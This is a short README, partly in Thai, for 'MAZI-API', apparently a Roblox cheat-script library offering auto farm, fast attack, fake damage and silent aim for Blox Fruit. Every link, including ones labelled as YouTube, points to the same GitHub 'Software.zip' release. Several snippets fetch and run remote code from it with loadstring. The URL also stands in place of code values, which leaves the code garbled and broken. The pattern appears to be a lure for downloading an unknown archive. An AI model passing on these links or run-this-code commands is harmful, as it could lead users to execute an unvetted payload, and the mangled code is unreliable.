# DOCS MAZI-API
---- Save Setting API ----
youtube : https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip
```lua
getgenv().Setting = {} -- Setting
Check_Setting(ชื่อไฟล์) -- Checkว่า File มีอยู่ไหม
Get_Setting(ชื่อไฟล์) -- ดูว่า Setting มีอะไรบ้าง
Update_Setting(ชื่อไฟล์) -- Update Setting ใหม่
---- เเถม ----
getgenv()['MyName'] -- Getชื่อของตัวเอง
JsonEncode(table) -- แปลงค่าเป็น JSON
JsonDecode(JSON) -- แปลงจาก JSON เป็น Table
---- Ex. ----
getgenv().Setting = {
    ['Auto Farm'] = false,
    ['Fly'] = true
}
pcall(function()loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))() end)
local JSON = JsonEncode({abc='fff'})
JsonDecode(JSON)
Check_Setting(getgenv()['MyName'])
Get_Setting(getgenv()['MyName'])
Update_Setting(getgenv()['MyName'])

```
---- Crypt API ----
```lua
local MAZICryptAPI = loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))()
encrypt(secertkey,data) -- encrypt

```
---- Fast Attack ----
youtube : https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip
```lua
loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))()
```
---- Fake Damage ---- 
youtube : https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip
```lua
loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))()
แค่รัน code ด้านบนเเล้ว รัน FakeDamage()
หรือรันพร้อมกันเช่น
loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))()
FakeDamage()
อธิบายเกี่ยวกับ Function FakeDamage
FakeDamage จะมี 1 Args คือ Damage 
เช่น
FakeDamage(100)
```
---- Silent Aim Blox Fruit ----
```lua
getgenv().setting = {
    Fov = 50,
    Color = https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip(191, 255, 209),
    LockPlayers = false,
    LockPlayersBind = https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip,
    resetPlayersBind = https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip,
}
loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))()
```
---- Attack No Animation ----
```lua
loadstring(game:HttpGet("https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip%20No%20Animation"))()
```
